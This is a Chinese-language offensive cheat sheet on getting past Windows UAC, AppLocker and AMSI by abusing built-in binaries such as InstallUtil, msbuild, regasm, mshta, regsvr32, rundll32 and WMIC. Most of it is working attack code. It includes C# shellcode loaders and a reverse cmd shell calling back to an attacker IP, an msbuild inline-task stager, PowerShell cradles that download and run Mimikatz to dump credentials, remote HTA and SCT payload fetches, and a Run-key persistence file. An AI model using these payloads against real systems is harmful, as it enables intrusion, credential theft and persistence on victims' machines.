![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpjzW7Kxl3oPia3YyjRwcfMJKtCAqT2YqItMTEuebTQLPuwOCpvFdzjzQ/640?wx_fmt=png)

```
值修改为


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpSSn5a5ibkAkWJtmWfcdia7F1Xomd9zaC17W9sHpwtqZicPJCezPEW0s4g/640?wx_fmt=png)

```
MSF监听，再次打开eventvwr


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFprLH13ibztIetcwst793mqWwp5QbXhMnKfm8WEkLTZPicM6g7yJPFIn2g/640?wx_fmt=png)

#### Web Delivery

```
\>use exploit/multi/script/web\_delivery
>set target 3
>set payload windows/x64/meterpreter/reverse\_tcp
>exploit
>use auxiliary/server/regsvr32\_command\_delivery\_server
>set cmd ipconfig
>use exploit/windows/misc/regsvr32\_applocker\_bypass\_server

```

#### Invoke-PsUACme

```
method="sysprep","oobe","ActionQueue","migwiz","cliconfg","winsat","mmc"
>Invoke-PsUACme -method oobe -Payload "c:\\user\\a\\desktop\\x.exe"
需指定绝对路径
>Invoke-PsUACme -method oobe -Payload "powershell -w hidden -e xxxxxx"
>Invoke-PsUACme -Payload "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
MSFVENOM生成psh-reflection格式脚本
>Invoke-PsUACme –Payload "powershell c:\\1.ps1"

```

### Whitelist(白名单)

#### GreatSCT

```
\>git clone https://github.com/GreatSCT/GreatSCT.git
>cd GreatSCT/setup&./setup.sh
>use Bypass
>list
>use regasm/meterpreter/rev\_tcp.py
>msfconsole -r /usr/share/greatsct-output/handlers/payload.rc

```

#### JSRat

```
\>JSRat.py -i 192.168.1.107 -p 4444

```

#### Odbcconf.exe

```
\>odbcconf.exe /a {regsvr C:\\shell.dll} 可以是任意后缀

```

#### Msiexec.exe

```
\>msiexec /y c:\\user\\admin\\desktop\\1.dll
>msiexec /q /i http://192.168.0.107/dll.dll

```

#### InstallUtil.exe

```
\>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:y.exe  /unsafe C:\\Users\\y\\Desktop\\1.cs
using System;
using System.Net;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Configuration.Install;
using System.Windows.Forms;
public class GQLBigHgUniLuVx {
  public static void Main()
{
    while(true)
    {{ MessageBox.Show("doge"); Console.ReadLine();}}
  }
}
\[System.ComponentModel.RunInstaller(true)\]
public class esxWUYUTWShqW : System.Configuration.Install.Installer
{
  public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)
{
    jkmhGrfzsKQeCG.LCIUtRN();
  }
}
public class jkmhGrfzsKQeCG
{ \[DllImport("kernel")\] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);
\[DllImport("kernel32")\] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);
\[DllImport("kernel32")\] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);
static byte\[\] ErlgHH(string ZwznjBJY,int KsMEeo) {
IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);
Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try { XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); }
catch { return null;}
byte\[\] UmquAHRnhhpuE = new byte\[4\];
XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);
int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);
byte\[\] qaYyFq = new byte\[kFVRSNnpj +5\];
int SRCDELibA =0;
while(SRCDELibA < kFVRSNnpj)
{ SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)<4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);}
byte\[\] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);
Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq\[0\]=0xBF;
return qaYyFq;}
static void cmMtjerv(byte\[\] HEHUjJhkrNS) {
if(HEHUjJhkrNS !=null) {
UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);
Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);
IntPtr UhxtIFnlOQatrk = IntPtr.Zero;
UInt32 wdjYKFDCCf =0;
IntPtr XVYcQxpp = IntPtr.Zero;
UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);
WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); }}
public static void LCIUtRN() {
byte\[\] IBtCWU =null; IBtCWU = ErlgHH("192.168.0.107",12138);
cmMtjerv(IBtCWU);
} }
生成exe后执行
>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\y\\Desktop\\y.exe
MSF监听12138端口

```

#### Compiler.exe

```
\>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe 1.xml 1.tcp

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1ywhxwNThVek0tW3d1TeyicZH1bPuzeicdvqs9hNCQRFNceDTN5WUJzVfQ/640?wx_fmt=png)

##### 1.xml

```
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
<files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
<d2p1:string>1.tcp</d2p1:string>
</files>
<parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
<assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
<embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
<generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
<includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
<linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></outputName>
<tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
<warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
<win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<d2p1:checkTypes>false</d2p1:checkTypes>
<d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
<d2p1:compilerOptions i:nil="true" />
<d2p1:generateCCU>false</d2p1:generateCCU>
<d2p1:languageToUse>CSharp</d2p1:languageToUse>
<d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
<d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
<d2p1:mtInfo i:nil="true"/>
<d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
</parameters>
</CompilerInput>

```

##### 1.tcp

```
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Workflow.Activities; 
public class Program : SequentialWorkflowActivity
{
static StreamWriter streamWriter; 
public Program()
{
using(TcpClient client = new TcpClient("192.168.0.107", 12138))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream); 
StringBuilder strInput = new StringBuilder(); 
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine(); 
while(true)
{
strInput.Append(rdr.ReadLine());
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
} 
private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder(); 
if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
} 
}
>msfvenom -p windows/x64/shell/reverse\_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe 1.xml 1.cs

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1y6hwo1pWIQiaU3KkCkb0fbJT9BjkTFibfnZicqGbYFHt37XWqGX2ERedmg/640?wx_fmt=png)

```
using System.Workflow.Activities;
using System.Net; 
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
class yrDaTlg : SequentialWorkflowActivity {
\[DllImport("kernel32")\] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ);
\[DllImport("kernel32")\] public static extern bool VirtualProtect(IntPtr DStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVpSg);
\[DllImport("kernel32")\]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB);
\[DllImport("kernel32")\] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM);
public yrDaTlg() {
byte\[\] QWKpWKhcs =
{SHELLCODE
};
IntPtr AmnGaO = VirtualAlloc(0, (UInt32)QWKpWKhcs.Length, 0x3000, 0x04);
Marshal.Copy(QWKpWKhcs, 0, (IntPtr)(AmnGaO), QWKpWKhcs.Length);
IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = 0; IntPtr pAeCTfwBS = IntPtr.Zero;
uint BnhanUiUJaetgy;
bool iSdNUQK = VirtualProtect(AmnGaO, (uint)0x1000, (uint)0x20, out BnhanUiUJaetgy);
oXmoNUYvivZlXj = CreateThread(0, 0, AmnGaO, pAeCTfwBS, 0, ref XVXTOi);
WaitForSingleObject(oXmoNUYvivZlXj, 0xFFFFFFFF);}
}

```

#### Csc

```
\>msfvenom -p windows/x64/shell/reverse\_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\\Users\\y\\Desktop\\shell.exe /platform:x64 /unsafe C:\\Users\\y\\Desktop\\shell.cs
>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\y\\Desktop\\shell.exe
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices; 
public class Program
{
public static void Main()
{
}
}
\[System.ComponentModel.RunInstaller(true)\]
public class Sample : System.Configuration.Install.Installer
{
public override void Uninstall(System.Collections.IDictionary savedState)
{
Shellcode.Exec();
}
}
public class Shellcode
{
public static void Exec()
{
byte\[\] shellcode = new byte\[510\] {
 SHELLCODE
};
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
}
private static UInt32 MEM\_COMMIT = 0x1000;
private static UInt32 PAGE\_EXECUTE\_READWRITE = 0x40;
\[DllImport("kernel32")\]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
\[DllImport("kernel32")\]
private static extern bool VirtualFree(IntPtr lpAddress,
UInt32 dwSize, UInt32 dwFreeType);
\[DllImport("kernel32")\]
private static extern IntPtr CreateThread(
UInt32 lpThreadAttributes,
UInt32 dwStackSize,
UInt32 lpStartAddress,
IntPtr param,
UInt32 dwCreationFlags,
ref UInt32 lpThreadId
);
\[DllImport("kernel32")\]
private static extern bool CloseHandle(IntPtr handle);
\[DllImport("kernel32")\]
private static extern UInt32 WaitForSingleObject(
IntPtr hHandle,
UInt32 dwMilliseconds
);
\[DllImport("kernel32")\]
private static extern IntPtr GetModuleHandle(
string moduleName
);
\[DllImport("kernel32")\]
private static extern UInt32 GetProcAddress(
IntPtr hModule,
string procName
);
\[DllImport("kernel32")\]
private static extern UInt32 LoadLibrary(
string lpFileName
);
\[DllImport("kernel32")\]
private static extern UInt32 GetLastError();
}

```

```
Regasm


```

```
\>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\\Users\\y\\Desktop\\dll.dll  /unsafe C:\\Users\\y\\Desktop\\dll.cs
>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /u dll.dll
namespace HYlDKsYF
 {
   public class kxKhdVzWQXolmmF : ServicedComponent {
     public kxKhdVzWQXolmmF() { Console.WriteLine("doge"); }
     \[ComRegisterFunction\]
     public static void RegisterClass ( string pNNHrTZzW )
     {
       ZApOAKJKY.QYJOTklTwn();
       }
       \[ComUnregisterFunction\]
       public static void UnRegisterClass ( string pNNHrTZzW )
       {
         ZApOAKJKY.QYJOTklTwn();
         }
         }
         public class ZApOAKJKY  { \[DllImport("kernel32")\] private static extern UInt32 HeapCreate(UInt32 FJyyNB, UInt32 fwtsYaiizj, UInt32 dHJhaXQiaqW);
         \[DllImport("kernel32")\] private static extern UInt32 HeapAlloc(UInt32 bqtaDNfVCzVox, UInt32 hjDFdZuT, UInt32 JAVAYBFdojxsgo);
         \[DllImport("kernel32")\] private static extern UInt32 RtlMoveMemory(UInt32 AQdEyOhn, byte\[\] wknmfaRmoElGo, UInt32 yRXPRezIkcorSOo);
         \[DllImport("kernel32")\] private static extern IntPtr CreateThread(UInt32 uQgiOlrrBaR, UInt32 BxkWKqEKnp, UInt32 lelfRubuprxr, IntPtr qPzVKjdiF,UInt32 kNXJcS, ref UInt32 atiLJcRPnhfyGvp);
         \[DllImport("kernel32")\] private static extern UInt32 WaitForSingleObject(IntPtr XSjyzoKzGmuIOcD, UInt32 VumUGj);static byte\[\] HMSjEXjuIzkkmo(string aCWWUttzmy,int iJGvqiEDGLhjr) {
           IPEndPoint YUXVAnzAurxH = new IPEndPoint(IPAddress.Parse(aCWWUttzmy),iJGvqiEDGLhjr);
           Socket MXCEuiuRIWgOYze = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
           try { MXCEuiuRIWgOYze.Connect(YUXVAnzAurxH); }
           catch { return null;}
           byte\[\] Bjpvhc = new byte\[4\];
           MXCEuiuRIWgOYze.Receive(Bjpvhc,4,0);
int IETFBI = BitConverter.ToInt32(Bjpvhc,0);
byte\[\] ZKSAAFwxgSDnTW = new byte\[IETFBI +5\];
int JFPJLlk =0;
while(JFPJLlk < IETFBI)
{ JFPJLlk += MXCEuiuRIWgOYze.Receive(ZKSAAFwxgSDnTW, JFPJLlk +5,(IETFBI - JFPJLlk)<4096 ? (IETFBI - JFPJLlk) : 4096,0);}
byte\[\] nXRztzNVwPavq = BitConverter.GetBytes((int)MXCEuiuRIWgOYze.Handle);
Array.Copy(nXRztzNVwPavq,0, ZKSAAFwxgSDnTW,1,4); ZKSAAFwxgSDnTW\[0\]=0xBF;
return ZKSAAFwxgSDnTW;}
static void TOdKEwPYRUgJly(byte\[\] KNCtlJWAmlqJ) {
  if(KNCtlJWAmlqJ !=null) {
    UInt32 uuKxFZFwog = HeapCreate(0x00040000,(UInt32)KNCtlJWAmlqJ.Length,0);
  UInt32 sDPjIMhJIOAlwn = HeapAlloc(uuKxFZFwog,0x00000008,(UInt32)KNCtlJWAmlqJ.Length);
  RtlMoveMemory(sDPjIMhJIOAlwn, KNCtlJWAmlqJ,(UInt32)KNCtlJWAmlqJ.Length);
  UInt32 ijifOEfllRl =0;
  IntPtr ihXuoEirmz = CreateThread(0,0, sDPjIMhJIOAlwn, IntPtr.Zero,0, ref ijifOEfllRl);
  WaitForSingleObject(ihXuoEirmz,0xFFFFFFFF);}}
  public static void QYJOTklTwn() {
    byte\[\] ZKSAAFwxgSDnTW =null; ZKSAAFwxgSDnTW = HMSjEXjuIzkkmo("192.168.0.107",12138);
    TOdKEwPYRUgJly(ZKSAAFwxgSDnTW);
    } } }

```

```
Msbuild


```

```
https://gitee.com/RichChigga/msbuild-exec
MSF监听
>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe 1.xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target >
<xUokfh />
</Target>
<UsingTask
Task
TaskFactory="CodeTaskFactory"
AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
<Task>
<Code Type="Class" Language="cs">
<!\[CDATA\[
using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;
using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class xUokfh : Task, ITask {
\[DllImport("kernel32")\] private static extern UInt32 VirtualAlloc(UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW);
\[DllImport("kernel32")\]private static extern IntPtr CreateThread(UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSLHGJiurGO, UInt32 vjSCprCJ, ref UInt32 KbPukprMQXUp);
\[DllImport("kernel32")\] private static extern UInt32 WaitForSingleObject(IntPtr wVCIQGmqjONiM, UInt32 DFgVrE);
static byte\[\] VYcZlUehuq(string IJBRrBqhigjGAx, int XBUCexXIrGIEpe) {
IPEndPoint DRHsPzS = new IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx),XBUCexXIrGIEpe);
Socket zCoDOd = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try { zCoDOd.Connect(DRHsPzS); }
catch { return null;}
byte\[\] OCrGofbbWRVsFEl = new byte\[4\];
zCoDOd.Receive(OCrGofbbWRVsFEl, 4, 0);
int auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, 0);
byte\[\] MlhacMDOKUAfvMX = new byte\[auQJTjyxYw + 5\];
int GFtbdD = 0;
while (GFtbdD < auQJTjyxYw)
{ GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + 5, (auQJTjyxYw -GFtbdD) < 4096 ? (auQJTjyxYw - GFtbdD) : 4096, 0);}
byte\[\] YqBRpsmDUT = BitConverter.GetBytes((int)zCoDOd.Handle);
Array.Copy(YqBRpsmDUT, 0, MlhacMDOKUAfvMX, 1, 4); MlhacMDOKUAfvMX\[0\]= 0xBF;
return MlhacMDOKUAfvMX;}
static void NkoqFHncrcX(byte\[\] qLAvbAtan) {
if (qLAvbAtan != null) {
UInt32 jrYMBRkOAnqTqx = VirtualAlloc(0, (UInt32)qLAvbAtan.Length, 0x1000, 0x40);
Marshal.Copy(qLAvbAtan, 0, (IntPtr)(jrYMBRkOAnqTqx),qLAvbAtan.Length);
IntPtr WCUZoviZi = IntPtr.Zero;
UInt32 JhtJOypMKo = 0;
IntPtr UxebOmhhPw = IntPtr.Zero;
WCUZoviZi = CreateThread(0, 0, jrYMBRkOAnqTqx, UxebOmhhPw, 0, ref JhtJOypMKo);
WaitForSingleObject(WCUZoviZi, 0xFFFFFFFF); }}
public override bool Execute()
{
byte\[\] uABVbNXmhr = null; uABVbNXmhr = VYcZlUehuq("192.168.0.107",12138);
NkoqFHncrcX(uABVbNXmhr);
return true; } }
\]\]>
</Code>
</Task>
</UsingTask>
</Project>

```

#### Winrm

`MSF监听`

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yBMo7YAlmibVlamIMWET96hUxWxicxCcfokGFF9ibBorrDricoEmdlns5rA/640?wx_fmt=png)

```
\>mkdir winrm
>copy c:\\Windows\\System32\\cscript.exe winrm
创建文件WsmPty.xsl复制payload进去

```

```
执行
>cscript.exe //nologo C:\\Windows\\System32\\winrm.vbs get wmicimv2/Win32\_Process?Handle=4 -format:pretty

```

#### Mshta

```
\>use exploit/windows/misc/hta\_server
>set srvhost 192.168.0.107
>mshta http://192.168.0.107:8080/RgNeCv.hta

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yYfvxqjjEMyhjzibA1dl0eYfQmiaia0yJtsdCxibv9rvUPtR7TFXzTlHcvg/640?wx_fmt=png)

```
执行vb
  >mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close)
Js
  >mshta javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
Jsrat
  >mshta javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}

```

```
Regsvr32


```

```
上线Empire
>usestager windows/launcher\_sct
生成sct文件放入web目录
>regsvr32 /s /n /u /i:http://192.168.0.107:8080/launcher.sct scrobj.dll
>cscript /b C:\\Windows\\System32\\Printing\_Admin\_Scripts\\zh-CN\\pubprn.vbs 127.0.0.1 script:http://192.168.0.107/test.sct

```

```
Rundll32


```

##### **执行文件**

```
\>rundll32 url.dll, OpenURL file://c:\\windows\\system32\\calc.exe
>rundll32 url.dll, OpenURLA file://c:\\windows\\system32\\calc.exe
>rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
>rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
>rundll32 url.dll, FileProtocolHandler calc.exe

```

```
无弹窗执行


```

```
\>rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";new%20ActiveXObject("WScript.Shell").Run("C:/Windows/System32/mshta.exe http://192.168.0.107:8080/SU8Fd6kNRz0.hta",0,true);self.close();

```

```
增删注册表


```

```
保存为.inf文件
>rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
\[Version\]
Signature="$WINDOWS NT$"
\[DefaultInstall\]
AddReg=AddReg
DelReg=DelReg
\[AddReg\] #删除DelReg删掉红色部分执行
HKLM,SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,SYSTEM,0x00000000,c:/windows/temp/sv.exe
0x00010001表示REG\_DWORD数据类型，0x00000000或省略该项(保留逗号)表示REG\_SZ(字符串)

```

```
写文件


```

```
\>rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";fso=new%20ActiveXObject("Scripting.FileSystemObject");a=fso.CreateTextFile("c:\\\\Temp\\\\testfile.txt",true);a.WriteLine("Test");a.Close();self.close();

```

```
Out-RundllCommand


```

```
使用nishang脚本Out-RundllCommand生成rundll代码
>powershell -nop -w h -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Execution/Out-RundllCommand.ps1'); Out-RundllCommand -Reverse -IPAddress 192.168.0.107 -Port 12345"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yePtbCzez5bN6krMRZfBIjCibhchiaBkW9Ly7UJDcwv5WxJzqAibE2G0Zw/640?wx_fmt=png)

```
注：低版本powershell，隐藏窗口只识别-w hidden，高版本可以-w h
执行远程PS脚本


```

```
注：低版本powershell，隐藏窗口只识别-w hidden，高版本可以-w h
执行远程PS脚本
>Out-RundllCommand -PayloadURL http://192.168.0.107/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.107 -Port 12138"
上线MSF
生成psh-reflection格式脚本
>rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();r=new%20ActiveXObject("WScript.Shell").run("powershell -w hidden -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('http://192.168.0.107/xx.ps1'));",0,true);

```

**DotNetToJScript**

```
通过js/vbs执行.net程序
https://github.com/tyranid/DotNetToJScript/releases
>DotNetToJScript.exe -o 1.js ExampleAssembly.dll 生成js
>DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll生成vbs
>DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll 生成vba
>DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll生成sct

```

```
StarFighters


```

```
https://github.com/Cn33liz/StarFighters 可以执行powershell代码，详见
执行单条命令
$code = 'start calc.exe'
$bytes  = \[System.Text.Encoding\]::UNICODE.GetBytes($code);
$encoded = \[System.Convert\]::ToBase64String($bytes)
$encoded
复制为var EncodedPayload的值
远程执行mimikatz
powershell IEX "(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'log privilege::debug sekurlsa::logonpasswords'"
以上保存在code.txt
$code = Get-Content -Path code.txt
$bytes  = \[System.Text.Encoding\]::UNICODE.GetBytes($code);
$encoded = \[System.Convert\]::ToBase64String($bytes)
$encoded | Out-File 2.txt

```

```
生成的2.txt文件内容替换为var EncodedPayload的值再执行


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yYMogG4tBcY5RXPe3HjdU6370bI14WsQrenLrkJ08H2CeAbzl9iaOrzQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yKtgM01shznVLPAHkjgSQcqDuwEMCuTROxM2kpvuI4RbK63lZVIEbug/640?wx_fmt=png)

##### 绕过 AMSI 执行

```
\>copy c:\\windows\\system32\\cscript.exe amsi.dll
>amsi.dll evil.js

```

#### WMIC

```
Empire建立监听，生成windows/launcher\_xsl模块的xsl文件保存在web目录
>wmic process get brief /format:http://192.168.0.107:8080/launcher.xsl

```

```
也可结合mshta使用


```

```
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
  <!\[CDATA\[
  var r = new ActiveXObject("WScript.Shell").Run("mshta http://192.168.0.107:8080/RgNeCv.hta");
  \]\]> </ms:script>
</stylesheet>

```

#### Msxsl

```
下载
https://www.microsoft.com/en-us/download/details.aspx?id=21714
远程执行shellcode
https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml
